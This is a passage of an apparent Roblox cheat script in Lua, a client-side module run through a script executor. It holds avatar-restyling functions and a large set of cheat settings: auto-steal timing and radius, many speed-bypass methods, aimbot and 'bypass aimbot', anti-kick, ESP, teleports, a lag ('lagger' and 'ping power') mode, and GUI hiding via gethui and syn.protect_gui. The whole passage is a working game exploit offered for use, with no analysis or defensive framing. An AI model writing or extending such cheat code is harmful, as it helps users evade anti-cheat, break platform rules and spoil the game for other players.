        shirt = Instance.new("Shirt")
        shirt.Name = "VynxWhiteShirt"
        shirt.Parent = char
    end
    pcall(function() shirt.ShirtTemplate = "rbxassetid://855777286" end)
    local pants = char:FindFirstChildOfClass("Pants")
    if not pants then
        pants = Instance.new("Pants")
        pants.Name = "VynxWhitePants"
        pants.Parent = char
    end
    pcall(function() pants.PantsTemplate = "rbxassetid://855782781" end)

    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Hat") then
            pcall(function() child:Destroy() end)
        end
    end
    end

M.vynxWhiteSkinEnabled = false

function M.applyCharterToChar(char)
    if not char then return end

    if M.removeAccEnabled then
        for _, child in ipairs(char:GetChildren()) do
            if child:IsA("Accessory") or child:IsA("Hat") then
                if not (child:GetAttribute("VynxSkin") or child:GetAttribute("VynxHorn") or (child.Name and (child.Name:find("Vynx") or child.Name:find("VynxHorn")))) then
                    pcall(function() child:Destroy() end)
                end
            end
        end
    end
    if M.headlessEnabled then
        pcall(function() M.applyHeadlessToChar(char, true) end)
    else
        pcall(function() M.applyHeadlessToChar(char, false) end)
    end
    if M.korbloxEnabled then
        pcall(function() M.applyKorbloxToChar(char, true) end)
    else
        pcall(function() M.applyKorbloxToChar(char, false) end)
    end

    if false and M.vynxHornsEnabled then
        pcall(function() M.equipVynxHorns(char) end)
    end

    if M.skinPack and M.skinPack ~= "Off" and M.SKIN_PACKS and M.SKIN_PACKS[M.skinPack] then
        task.defer(function()
            if player.Character == char then
                pcall(function() M.applySkinPack(M.skinPack) end)
            end
        end)
    end

    -- Animations: only pack/unwalk if toggled on; otherwise original (vanilla)
    if M.applyWalkState then
        pcall(function() M.applyWalkState(char) end)
    elseif M.animPackEnabled and M.animPack and M.PACKS and M.PACKS[M.animPack] then
        pcall(function() M.applyAnimPack(M.animPack) end)
    elseif M.unwalkEnabled == true then
        pcall(function() if M.startUnwalk then M.startUnwalk() end end)
    else
        pcall(function()
            if M.forceVanillaAnimate then M.forceVanillaAnimate(char)
            elseif M.resetAnimations then M.resetAnimations(char) end
        end)
    end
end

function M.stripVynxClothing(char)
    if not char then return end
    for _, c in ipairs(char:GetChildren()) do
        if c:IsA("Shirt") or c:IsA("Pants")
            or c:IsA("ShirtGraphic") or c:IsA("Clothing")
            or c.ClassName == "LayeredClothing" then
            if not c:GetAttribute("VynxChip") then
                pcall(function() c:Destroy() end)
            end
        end

    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    pcall(function()
        if not hum then return end
        local desc = hum:GetAppliedDescription()
        if not desc then return end
        desc.Shirt = 0
        desc.Pants = 0
        desc.GraphicTShirt = 0
        pcall(function() hum:ApplyDescription(desc) end)
    end)
end

function M.clearVynxTorsoChip(char)
    if not char then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part.Name == "VynxTorsoChipBB" or part.Name == "VynxTorsoChipSG" then
            pcall(function() part:Destroy() end)
        end
    end
end

function M.attachVynxPantsTag(char)
    -- VYNX pants/shirt text tags removed
    if not char then return end
    local legNames = {
        "LeftLowerLeg", "RightLowerLeg", "LeftUpperLeg", "RightUpperLeg",
        "Left Leg", "Right Leg",
    }
    for _, name in ipairs(legNames) do
        local leg = char:FindFirstChild(name)
        if leg then
            for _, c in ipairs(leg:GetChildren()) do
                if c.Name == "VynxPantsTag" or c:GetAttribute("VynxChip") then
                    pcall(function() c:Destroy() end)
                end
            end
        end
    end
end

function M.attachVynxBellyTag(char)
    -- VYNX belly/torso text tags removed
    if not char then return end
    local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not torso then return end
    for _, c in ipairs(torso:GetChildren()) do
        if c.Name == "VynxBellyTag" or c.Name == "VynxTorsoChipBB" or c.Name == "VynxTorsoChipSG" then
            pcall(function() c:Destroy() end)
        end
    end
end

function M.attachVynxHat(char)
    if not char then return end
    local head = char:FindFirstChild("Head")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not head then return end
    for _, c in ipairs(char:GetChildren()) do
        if c.Name == "VynxHat" or c.Name == "VynxHatBrim" or (c:IsA("Accessory") and c:GetAttribute("VynxChip")) then
            pcall(function() c:Destroy() end)
        end
    end

    local acc = Instance.new("Accessory")
    acc.Name = "VynxHat"
    acc:SetAttribute("VynxChip", true)

    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 1)
    handle.Color = Color3.fromRGB(10, 10, 12)
    handle.Material = Enum.Material.SmoothPlastic
    handle.CanCollide = false
    handle.Massless = true
    handle.Transparency = 0
    handle.Parent = acc

    local mesh = Instance.new("SpecialMesh")
    mesh.Name = "Mesh"
    mesh.MeshType = Enum.MeshType.FileMesh

    mesh.MeshId = "rbxassetid://1026228"
    mesh.TextureId = ""
    mesh.Scale = Vector3.new(1.35, 1.35, 1.35)
    mesh.VertexColor = Vector3.new(0.05, 0.05, 0.06)
    mesh.Parent = handle

    local att = Instance.new("Attachment")
    att.Name = "HatAttachment"
    att.Parent = handle

    acc.Parent = char
    pcall(function()
        if hum then
            hum:AddAccessory(acc)
        end
    end)

    if not handle:FindFirstChildOfClass("Weld") and not handle:FindFirstChildOfClass("WeldConstraint") then
        local w = Instance.new("Weld")
        w.Part0 = head
        w.Part1 = handle
        w.C0 = CFrame.new(0, 0.65, 0.05)
        w.Parent = handle
    end
end

function M.applyVynxBlackSkin(char)
    char = char or player.Character
    if not char then return end
    if not M.vynxBlackSkinEnabled then return end

    M.stripVynxClothing(char)
    M.clearVynxTorsoChip(char)

    local black = Color3.fromRGB(15, 15, 17)
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart"
            and p.Name ~= "VynxHat" and p.Name ~= "VynxHatBrim" then
            pcall(function()
                p.Color = black
                p.Material = Enum.Material.SmoothPlastic
                if p:IsA("MeshPart") then
                    p.TextureID = ""
                end
            end)
        elseif p:IsA("SpecialMesh") and p.Parent and p.Parent.Name ~= "VynxHat" then
            pcall(function()
                p.TextureId = ""
            end)
        elseif p:IsA("Decal") or p:IsA("Texture") then
            if p.Name == "face" or p.Name == "Face" then
                pcall(function() p:Destroy() end)
            end
        end
    end
    local bc = char:FindFirstChildOfClass("BodyColors")
    if bc then
        pcall(function()
            bc.HeadColor3 = black
            bc.LeftArmColor3 = black
            bc.RightArmColor3 = black
            bc.LeftLegColor3 = black
            bc.RightLegColor3 = black
            bc.TorsoColor3 = black
        end)
    end

    -- VYNX text tags disabled
    pcall(function() M.attachVynxBellyTag(char) end) -- cleans only
    pcall(function() M.attachVynxPantsTag(char) end) -- cleans only
    M.attachVynxHat(char)

    if M._vynxBlackChildConn then
        pcall(function() M._vynxBlackChildConn:Disconnect() end)
        M._vynxBlackChildConn = nil
    end
    M._vynxBlackChildConn = char.ChildAdded:Connect(function(c)
        if not M.vynxBlackSkinEnabled then return end
        if c:GetAttribute("VynxChip") then return end
        if c.Name == "VynxHat" or c.Name == "VynxHatBrim" or c:GetAttribute("VynxChip") then return end

        if c:IsA("Shirt") or c:IsA("Pants")
            or c:IsA("ShirtGraphic") or c:IsA("Clothing") then
            task.defer(function() pcall(function() c:Destroy() end) end)
        end
    end)
end

M.VYNC_SKIN_ID = 116358759349760
M.vyncSkinEnabled = false

local function vyncStrip(char)

    if not char then return end
end

local function vyncFindAcc(obj)
    if not obj then return nil end
    if obj:IsA("Accessory") or obj:IsA("Hat") then return obj end
    local a = obj:FindFirstChildOfClass("Accessory") or obj:FindFirstChildOfClass("Hat")
    if a then return a end
    for _, d in ipairs(obj:GetDescendants()) do
        if d:IsA("Accessory") or d:IsA("Hat") then return d end
    end
    return nil
end

local function vyncLoad(id)
    id = tonumber(id) or 0
    if id <= 0 then return nil end
    local url = "rbxassetid://" .. tostring(id)
    local bag = {}
    pcall(function()
        if typeof(getobjects) == "function" then
            local t = getobjects(url)
            if type(t) == "table" then for _, o in ipairs(t) do table.insert(bag, o) end end
        elseif game.GetObjects then
            local t = game:GetObjects(url)
            if type(t) == "table" then for _, o in ipairs(t) do table.insert(bag, o) end end
        end
    end)
    pcall(function()
        local m = game:GetService("InsertService"):LoadAsset(id)
        if m then table.insert(bag, m) end
    end)
    pcall(function()
        local IS = game:GetService("InsertService")
        if IS.LoadLocalAsset then
            local o = IS:LoadLocalAsset(url)
            if o then table.insert(bag, o) end
        end
    end)
    for _, o in ipairs(bag) do
        local acc = vyncFindAcc(o)
        if acc then
            local cl = acc:Clone()
            cl:SetAttribute("VynxSkin", true)
            cl.Name = "VynxSkin"
            for _, x in ipairs(bag) do pcall(function() x:Destroy() end) end
            return cl
        end
    end
    for _, x in ipairs(bag) do pcall(function() x:Destroy() end) end
    return nil
end

function M.applyVyncSkin(char)
    if not M.vyncSkinEnabled then return end
    char = char or player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 6)
    if not hum then return end
    vyncStrip(char)
    for _, c in ipairs(char:GetChildren()) do
        if (c:IsA("Accessory") or c:IsA("Hat")) and c:GetAttribute("VynxSkin") then return end
    end
    local id = tonumber(M.VYNC_SKIN_ID) or 116358759349760
    local acc = vyncLoad(id)
    if acc then
        pcall(function() hum:AddAccessory(acc) end)
        if not acc.Parent then acc.Parent = char end
        return
    end
    pcall(function()
        local desc = hum:GetAppliedDescription()
        if not desc then return end
        local idStr = tostring(id)
        for _, slot in ipairs({"HatAccessory","HairAccessory","FaceAccessory","NeckAccessory","ShouldersAccessory","FrontAccessory","BackAccessory","WaistAccessory"}) do
            pcall(function() desc[slot] = "" end)
        end
        for _, slot in ipairs({"HatAccessory","HairAccessory","BackAccessory","FrontAccessory","FaceAccessory","NeckAccessory","ShouldersAccessory","WaistAccessory"}) do
            pcall(function() desc[slot] = idStr end)
        end
        pcall(function() hum:ApplyDescription(desc) end)
        task.wait(0.12)
        local kept = false
        for _, c in ipairs(char:GetChildren()) do
            if c:IsA("Accessory") or c:IsA("Hat") then
                if not kept then
                    kept = true
                    c:SetAttribute("VynxSkin", true)
                    c.Name = "VynxSkin"
                else
                    pcall(function() c:Destroy() end)
                end
            end
        end
        if not kept then
            local a2 = vyncLoad(id)
            if a2 then
                pcall(function() hum:AddAccessory(a2) end)
                if not a2.Parent then a2.Parent = char end
            end
        end
    end)
end

function M.clearVyncSkin(char)
    char = char or player.Character
    if not char then return end
    for _, c in ipairs(char:GetChildren()) do
        if (c:IsA("Accessory") or c:IsA("Hat")) and (c:GetAttribute("VynxSkin") or c.Name == "VynxSkin") then
            pcall(function() c:Destroy() end)
        end
    end
end

function M.setVyncSkin(on)
    M.vyncSkinEnabled = on == true
    if M.vyncSkinEnabled then
        M.applyVyncSkin(player.Character)
        task.delay(0.8, function() if M.vyncSkinEnabled then M.applyVyncSkin(player.Character) end end)
    else
        M.clearVyncSkin(player.Character)
    end
    if M.setVyncSkinVisual then pcall(function() M.setVyncSkinVisual(M.vyncSkinEnabled) end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.startVyncSkinWatch()
    if M._vyncCharConn then pcall(function() M._vyncCharConn:Disconnect() end); M._vyncCharConn = nil end
    M._vyncCharConn = player.CharacterAdded:Connect(function(char)
        if not M.vyncSkinEnabled then return end
        task.wait(0.45)
        M.applyVyncSkin(char)
        task.delay(1.2, function() if M.vyncSkinEnabled and player.Character == char then M.applyVyncSkin(char) end end)
        task.delay(2.5, function() if M.vyncSkinEnabled and player.Character == char then M.applyVyncSkin(char) end end)
    end)
    if M.vyncSkinEnabled and player.Character then
        task.defer(function() M.applyVyncSkin(player.Character) end)
    end
end

player.CharacterAdded:Connect(function(char)
    task.wait(0.35)

    M.applyCharterToChar(char)
    task.delay(0.25, function()
        if player.Character ~= char then return end
        pcall(function() M.applyWalkState(char) end)
        pcall(function() M.applyCharterToChar(char) end)
    end)
    task.delay(1.0, function()
        if player.Character ~= char then return end
        pcall(function() M.applyCharterToChar(char) end)
    end)
    task.delay(2.0, function()
        if player.Character ~= char then return end
        pcall(function() M.applyCharterToChar(char) end)
    end)
end)

task.spawn(function()
    task.wait(0.2)
    pcall(M.startVyncSkinWatch)
end)

M.NS = 59.5 -- from second source NormalSpeed
M.CS = 28.8 -- from second source CarrySpeed
M.LAGGER_SPEED = 24.5 -- from second source LaggerSpeed
M.LAGGER_CARRY_SPEED = 15 -- from second source LaggerCarrySpeed
M.BYPASS_SPEED = 40
M.BYPASS_CARRY_SPEED = 22
M.speedMethod = "LinearVelocity" -- RitualHub plane LV
M.speedMethodList = {
    "Velocity", "AssemblyLinearVelocity", "Velocity Lerp", "AssemblyLinearVelocity Lerp",
    "CFrame", "CFrame Lerp", "Hyper CFrame", "Anchored CFrame", "PivotTo", "Model PivotTo", "Tween CFrame",
    "WalkSpeed", "Humanoid Move", "Humanoid MoveTo",
    "BodyVelocity", "BodyPosition", "BodyForce", "BodyThrust",
    "LinearVelocity", "VectorForce", "AlignPosition",
    "ApplyImpulse", "RocketPropulsion",
}
M.hyperMult = 4
M._lastSpeedMethod = nil
M._speedHRP = nil
M._anchoredBySpeed = nil
M._bodyVel = nil
M._bodyPosition = nil
M._bodyForce = nil
M._bodyThrust = nil
M._linearVel = nil
M._vectorForce = nil
M._alignPos = nil
M._rocket = nil
M._rocketTarget = nil
M._attLinVel = nil
M._attVecForce = nil
M._attAlign = nil
M._speedTween = nil
M.carrySpeedActive = false
M.laggerModeEnabled = false
M.laggerCarryActive = false
M.speedCustomizerEnabled = false
M.speedCustomizerPanel = nil
M.speedUIMode = "Original"
M.speedBoosterEnabled = true
M.speedBoosterPath = "Normal"
M.speedBoosterPanelOpen = false
M.speedBoosterPos = nil
M.speedBoosterGui = nil
M.speedBoosterMain = nil

M.antiRagdollEnabled = false
M.hardHitEnabled = false
M.hardHitRadius = 10
M.antiRagdollMode = "Splatter"
M.infJumpEnabled = false
M.infJumpMode = "manual"
M.medusaCounterEnabled = false
M.batCounterEnabled = false
M.unwalkEnabled = false
M.medusaResetEnabled = false
M.medusaDebounce = false
M.medusaLastUsed = 0
M.dropActive = false
M.antiDropEnabled = true
M._antiDropAllow = false
M._antiDropLastTool = nil
M._antiDropConns = M._antiDropConns or {}
M.autoLeftEnabled = false
M.autoRightEnabled = false
M.autoBatEnabled = false
M.autoSwingEnabled = true
M.autoMoveSwingEnabled = false
M.autoMoveSwingInterval = 0.3
M._alSwingDebounce = false
M._arSwingDebounce = false
M.antiLagEnabled = false
M.fpsBoostEnabled = false
M._stretchRezConn = nil
M.batAimbotMode = M.batAimbotMode or "Normal" -- Normal | Bypass (Spectrum)
M.pingAlertEnabled = false
M.pingAlertThreshold = 120
M._pingAlertTask = nil
M._pingAlertConn = nil
M.pingPopupGui = nil
M.pingPopupActive = false

M.antiSummerBaseEnabled = false
M.antiSummerBaseConn = nil
M._antiSummerCleaned = {}

M.removeAccessoriesEnabled = false
M.antiLagDescConn = nil
M.unwalkSavedAnimate = nil
M._anyKeyListening = false
M.autoTPEnabled = false
M.autoTPHeight = 20
M.mirrorTPDownEnabled = true
M.mirrorTPPreviousY = {}
M.mirrorTPLastTeleport = 0
M.MIRROR_TP_DROP_THRESHOLD = 3
M.MIRROR_TP_DOWN_Y = -7.00
M.perfectHitEnabled = true
M.autoTPConn = nil
M.cursedResetRemote = nil
M.CURSED_RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
M.guiTransparencyEnabled = false
M.mobileButtonsEnabled = true
M.mobileButtonsLocked = false
M.mobileButtonsSize = 60
M.circleButtonsEnabled = false
M.mobileBtnVisible = {
    autoLeft = true, autoRight = true, autoBat = true, batTP = true,
    drop = true, tpDown = true, reset = true, laggerCarry = true,
    lagger = true, carrySpeed = true,
}
M.mobBtnRefs = {}
M.mobGuiRef = nil
M.fovValue = 90
M.fovOptions = {70, 80, 90, 100, 120, 150, 180}
M.fovIndex = 3
M.laggerModePillRef = nil
M.carryModePillRef = nil
M.autoSwitchSpeedEnabled = false
M.autoTurnOffSpeedEnabled = false
M.autoSwitchLaggerSpeedEnabled = false
M.autoCarryEnemyBaseEnabled = false
M.autoCarryEnemyBaseRange = 35
M._autoCarryEnemyBaseConn = nil
M.setAutoCarryEnemyBaseVisual = nil
M.AUTO_SWITCH_THRESHOLD = 25
M._autoSwitchSpeedConn = nil
M.customFontSelected = "None"
M._fontOrig = {}
M._fontConn = nil
M._fontMy = nil
M.FONT_NAMES = {"None", "Coding Font", "Summer", "Beachy", "Scary"}
M.mobBtnTransparencyEnabled = false
M.perButtonDragEnabled = true
M.antiKickEnabled = false
M.brainrotDetected = false
M.safeModeEnabled = false
M.activeBatBillboard = nil
M.activeMedusaBillboard = nil
M.ragdollGuiEnabled = true
M.persistentRagdollGui = nil
M.uiLocked = false
M.holdInfJumpConn = nil
M.DROP_ASCEND_DURATION = 0.22
M.DROP_ASCEND_SPEED = 160
M.autoResetOnDeath = false
M.bypassAimbotEnabled = false
M.batTPEnabled = true
M.batTPConn = nil
M.batTPSpeed = M.batTPSpeed or 58
M.batTPVersion = M.batTPVersion or "V1"
M.batAimbotVersion = M.batAimbotVersion or "V1"
M.antiDieFlingEnabled = M.antiDieFlingEnabled or false
M.antiDieEnabled = false
M.antiDieFlingEnabled = false
M.antiFlingEnabled = false
M.bypassAimbotConn = nil
M._bypassGodConn = nil
M._bypassGodHealthConn = nil
M._bypassGodDiedConn = nil
M._bypassGodCharConn = nil
M.bypassPrevAutoRotate = nil
M.bypassHitCD = false
M.bypassSwingCD = 0.35
M.bypassHitDist = 8
M._bypassTarget = nil

M.stealMode = "V2"
M.stealBarStyle = "New"
M.stealBarSize = 420
M.stealBarPos = nil
M.Steal = {
    AutoStealEnabled = false,
    StealRadius = 61,
    StealDuration = 1.3,
    StopTime = 0.96,
}
M.autoGrabPausePct = 0.73
M.autoGrabSetDelayRadius = 9
M.autoGrabStopEnabled = true
M.autoGrabSetDelayRadius = 9
M.autoGrabStopEnabled = true
M.V3 = {
    enabled = false,
    conn = nil,
    progress = 0,
    lastInRange = 0,
    currentUid = nil,
    holding = false,
    holdPrompt = nil,
    cooldownUntil = 0,
    phase = "fill",
    pauseAt = 0,
    pauseExtra = 1.0,
}
M.autoRadiusEnabled = false
function M.getAutoRadius()
    local radius = math.clamp((tonumber(M.NS) or 60) + 1, 1, 500)
    return math.floor(radius * 10 + 0.5) / 10
end
function M.getActiveStealRadius()

    if M.stealMode == "Semi" then
        return math.min(tonumber(M.Semi.radius) or 10, 10)
    end
    if M.stealMode == "Normal" or M.stealMode == "V1" then
        return tonumber(M.Steal.StealRadius) or 63
    end

    return M.autoRadiusEnabled and M.getAutoRadius() or (tonumber(M.Steal.StealRadius) or 63)
end
M.Semi = {
    enabled = false,
    holdMin = 1.3,
    holdMax = 2.6,
    entryDelay = 0.3,
    cooldown = 0.05,
    primeRange = 80,
    radius = 10,
    conn = nil,
    scanThread = nil,
    plotSync = {caches = {}, connections = {}},
    animals = {},
    promptCache = {},
    internalCache = {},
    state = {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0},
    plots = nil,
    syncReady = false,
}
M.isStealing = false
M.stealStartTime = 0
M.stealConn = nil
M.progressConn = nil
M.animalCache = {}
M.promptCache = {}
M.stealCache = {}
M.playerESPEnabled = false
M.espList = {}
M.pingPopupActive = false
M.pingPopupGui = nil
M.pingCycleTimer = nil
M.pingPanelPos = nil
M.panelBgImageId = 79162198517476
M.PANEL_BG_IMAGE_IDS = {
    79162198517476,
    95898293805741,
}

M.pingPanelOpen = false
M.pingLocked = false
M.pingGui = nil
M.pingMain = nil
M.pingSettings = nil
M.pingActive = false
M.pingPower = 100000
M.pingMode = M.pingMode or "MID"
M.PING_MODE_POWER = { LOW = 70000, MID = 100000, HIGH = 110000 }
M.pingInterval = 0.125
M.pingKeybindKb = "T"
M.pingKeybindGp = "ButtonR2"
M.pingAutoBrainrot = true
M.pingRemote = nil
M.pingBrainrotMode = false
M.pingLastBrainrot = false
M.pingManualOverride = false
M.pingListening = nil
M.pingLoopRunning = false
M.firstJoin = true
M.justJoined = true
M.setPingPanelVisual = nil

local function _packUDim2(u)
    if typeof(u) ~= "UDim2" then return nil end
    return {sx = u.X.Scale, ox = u.X.Offset, sy = u.Y.Scale, oy = u.Y.Offset}
end
local function _unpackUDim2(t, fallback)
    if type(t) == "table" and type(t.sx) == "number" and type(t.sy) == "number" then
        return UDim2.new(t.sx, tonumber(t.ox) or 0, t.sy, tonumber(t.oy) or 0)
    end
    return fallback
end

M.Conns = {autoSteal=nil, antiRag=nil, batCounter=nil, anchor={}}
M._persistentConns = {}
M.alConn = nil
M.arConn = nil
M.alPhase = 1
M.arPhase = 1
M.aimbotConn = nil
M.lastMoveDir = Vector3.new(0,0,0)
M.batCounterDebounce = false
M.speedLabel = nil

M.KB = {
    DropBrainrot={kb=nil,gp=nil},
    AutoLeft={kb=nil,gp=nil},
    AutoRight={kb=nil,gp=nil},
    AutoBat={kb=nil,gp=nil},
    TPFloor={kb=nil,gp=nil},
    InstaReset={kb=nil,gp=nil},
    GuiHide={kb=nil,gp=nil},
    SpeedToggle={kb=nil,gp=nil},
    LaggerToggle={kb=nil,gp=nil},
    LaggerCarry={kb=nil,gp=nil},
    BypassAimbot={kb=nil,gp=nil},
    BatTP={kb=nil,gp=nil},
}
M.AP_L1 = Vector3.new(-476.47,-6.28,92.73)
M.AP_L2 = Vector3.new(-483.12,-4.95,94.81)
M.AP_R1 = Vector3.new(-476.16,-6.52,25.62)
M.AP_R2 = Vector3.new(-483.06,-5.03,25.48)
M.MEDUSA_COOLDOWN = 25
M.BAT_COUNTER_SLAP_LIST = {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
M.fovConn = nil
M.defLightBrightness = nil
M.defLightClock = nil
M.defLightAmbient = nil
M.mainFrame = nil
M.normalBox = nil
M.carryBox = nil
M.laggerBox = nil
M.radInput = nil
M.autoTPHeightBox = nil
M.durationBox = nil
M.modeValLbl = nil
M.setInstaGrab = nil
M.setInfJumpVisual = nil
M.setAntiRagVisual = nil
M.setAntiFlingVisual = nil
M.setMedusaVisual = nil
M.setUnwalkVisual = nil
M.setAntiLagVisual = nil
M.setAutoSwingVisual = nil
M.setTranspVisual = nil
M.setLockVisual = nil
M.setMobVisual = nil
M.setCircleBtnsVisual = nil
M.setMedusaResetVisual = nil
M.antiKickSetVisual = nil
M.autoLeftSetVisual = nil
M.autoRightSetVisual = nil
M.autoBatSetVisual = nil
M.setAutoTPVisual = nil
M.setAutoResetOnDeath = nil
M.setBypassVisual = nil
M._autoSwitchWasSteal = false

M.MOB_POS_FILE = "moveeduels_btnpos.json"
function M.themeDarkFromAccent(accent, amount)
    amount = math.clamp(tonumber(amount) or 0.12, 0, 1)
    if typeof(accent) ~= "Color3" then accent = Color3.fromRGB(255, 255, 255) end
    return Color3.new(
        math.clamp(accent.R * amount, 0, 1),
        math.clamp(accent.G * amount, 0, 1),
        math.clamp(accent.B * amount, 0, 1)
    )
end
M.MOVE_KEYS = {
    [Enum.KeyCode.W]=true,
    [Enum.KeyCode.A]=true,
    [Enum.KeyCode.S]=true,
    [Enum.KeyCode.D]=true,
    [Enum.KeyCode.Up]=true,
    [Enum.KeyCode.Left]=true,
    [Enum.KeyCode.Down]=true,
    [Enum.KeyCode.Right]=true
}

M.showPlayerSpeeds = false
M.playerSpeedGuis = {}
M.playerSpeedUpdateConn = nil
M.removeAccEnabled = false
M.removeAccConn = nil
M.removedAccessories = {}
M.uiScale = 0.6
if UIS.TouchEnabled and not UIS.KeyboardEnabled then
    M.uiScale = 0.6
end
M.uiScaleSliderRef = nil
M.uiScaleLabelRef = nil
M.uiScaleBoxRef = nil
M.lineESPEnabled = false
M.menuOpen = true
M.speedESPEnabled = false

M.statusGui = nil
M.statusFill = nil
M.statusPctLbl = nil
M.statusRadiusLbl = nil
M.statusDot = nil
M.statusMain = nil
M.statusFpsLbl = nil

function M.addShimmerToLabel(lbl,color1,color2)
    local gr=Instance.new("UIGradient",lbl)
    gr.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,color1 or Color3.fromRGB(100,100,100)),ColorSequenceKeypoint.new(0.5,color2 or Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,color1 or Color3.fromRGB(100,100,100))})
    gr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0.3,0),NumberSequenceKeypoint.new(0.5,0,0),NumberSequenceKeypoint.new(1,0.3,0)})
    return gr
end

function M.applyFOV()
    if M.fovConn then pcall(function() M.fovConn:Disconnect() end); M.fovConn = nil end
    if M._fovCamConn then pcall(function() M._fovCamConn:Disconnect() end); M._fovCamConn = nil end
    local function apply()
        if M.wideViewEnabled then return end
        local c = workspace.CurrentCamera
        if c then pcall(function() c.FieldOfView = tonumber(M.fovValue) or 90 end) end
    end
    apply()
    M._fovCamConn = workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(apply)
    local acc = 0
    M.fovConn = RunService.Heartbeat:Connect(function(dt)
        acc = acc + (dt or 0.016)
        if acc < 0.12 then return end
        acc = 0
        apply()
    end)
end

-- ===== Stretch Rez toggle (vertical resolution stretch) taken from the source =====
M.stretchEnabled = false
M.setStretchVisual = nil
local _VYNX_STRETCHREZ_STEP = "VynxStretchRez"

function M.enableStretchRez()
    M.stretchEnabled = true
    pcall(function() RunService:UnbindFromRenderStep(_VYNX_STRETCHREZ_STEP) end)
    pcall(function()
        RunService:BindToRenderStep(_VYNX_STRETCHREZ_STEP, Enum.RenderPriority.Last.Value - 1, function()
            local cam = workspace.CurrentCamera
            if cam then
                cam.CFrame = cam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.8, 0, 0, 0, 1)
            end
        end)
    end)
    if M.setStretchVisual then pcall(function() M.setStretchVisual(true) end) end
end

function M.disableStretchRez()
    M.stretchEnabled = false
    pcall(function() RunService:UnbindFromRenderStep(_VYNX_STRETCHREZ_STEP) end)
    if M.setStretchVisual then pcall(function() M.setStretchVisual(false) end) end
end

function M.setStretch(on)
    if on == true then
        M.enableStretchRez()
    else
        M.disableStretchRez()
    end
    pcall(saveCherryConfig)
end

M.ragdollTimerThread = nil
M.ragdollTimerRemaining = 0
M.isRagdollActive = false

function M._destroyRagdollGui()
    pcall(function()
        if M._ragdollGui and M._ragdollGui.Parent then M._ragdollGui:Destroy() end
    end)
    M._ragdollGui = nil
    if M.ragdollTimerThread then
        pcall(task.cancel, M.ragdollTimerThread)
        M.ragdollTimerThread = nil
    end
end

function M.updateRagdollTimer(duration, labelText)
    -- Black + blue ragdoll countdown (style from Anti-Sammy, recolored)
    if M.ragdollGuiEnabled == false then
        M._destroyRagdollGui()
        return
    end
    labelText = labelText or "RAGDOLL"
    if duration <= 0 then
        M.isRagdollActive = false
        M._destroyRagdollGui()
        if M.headIndicator and M.headIndicator.ragdollTimer then
            pcall(function() M.headIndicator.ragdollTimer.Text = "" end)
        end
        return
    end

    M.isRagdollActive = true
    M.ragdollTimerRemaining = duration
    M._destroyRagdollGui()

    local accent = Color3.fromRGB(60, 170, 255)       -- blue
    local accentDim = Color3.fromRGB(20, 90, 180)
    local bg = Color3.fromRGB(6, 10, 16)              -- near-black
    local bgCard = Color3.fromRGB(10, 16, 24)

    local guiName = "VynxRagdollTimer"
    pcall(function()
        local cg = game:GetService("CoreGui")
        local o = cg:FindFirstChild(guiName)
        if o then o:Destroy() end
    end)
    pcall(function()
        local pg = player:FindFirstChild("PlayerGui")
        local o = pg and pg:FindFirstChild(guiName)
        if o then o:Destroy() end
    end)

    local sg = Instance.new("ScreenGui")
    sg.Name = guiName
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 95
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(sg) end
    end)
    local parented = false
    if typeof(gethui) == "function" then
        parented = pcall(function() sg.Parent = gethui() end)
    end
    if not parented then
        parented = pcall(function() sg.Parent = game:GetService("CoreGui") end)
    end
    if not parented then
        local pg = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 2)
        if pg then sg.Parent = pg end
    end
    M._ragdollGui = sg

    local card = Instance.new("Frame")
    card.Name = "RecoveryTimer"
    card.AnchorPoint = Vector2.new(0.5, 0)
    card.Position = UDim2.new(0.5, 0, 0, 58)
    card.Size = UDim2.fromOffset(200, 50)
    card.BackgroundColor3 = bgCard
    card.BackgroundTransparency = 0.08
    card.BorderSizePixel = 0
    card.Parent = sg
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)

    local cardStroke = Instance.new("UIStroke", card)
    cardStroke.Color = accent
    cardStroke.Thickness = 1.4
    cardStroke.Transparency = 0.15

    local accentBar = Instance.new("Frame", card)
    accentBar.Position = UDim2.fromOffset(0, 8)
    accentBar.Size = UDim2.fromOffset(3, 34)
    accentBar.BackgroundColor3 = accent
    accentBar.BorderSizePixel = 0
    Instance.new("UICorner", accentBar).CornerRadius = UDim.new(1, 0)

    local icon = Instance.new("Frame", card)
    icon.Position = UDim2.fromOffset(12, 10)
    icon.Size = UDim2.fromOffset(28, 28)
    icon.BackgroundColor3 = accent
    icon.BackgroundTransparency = 0.7
    icon.BorderSizePixel = 0
    Instance.new("UICorner", icon).CornerRadius = UDim.new(1, 0)
    local iconStroke = Instance.new("UIStroke", icon)
    iconStroke.Color = accent
    iconStroke.Transparency = 0.25
    local iconText = Instance.new("TextLabel", icon)
    iconText.Size = UDim2.fromScale(1, 1)
    iconText.BackgroundTransparency = 1
    iconText.Text = labelText == "STONE" and "S" or "!"
    iconText.TextColor3 = accent
    iconText.Font = Enum.Font.GothamBlack
    iconText.TextSize = 14

    local titleLbl = Instance.new("TextLabel", card)
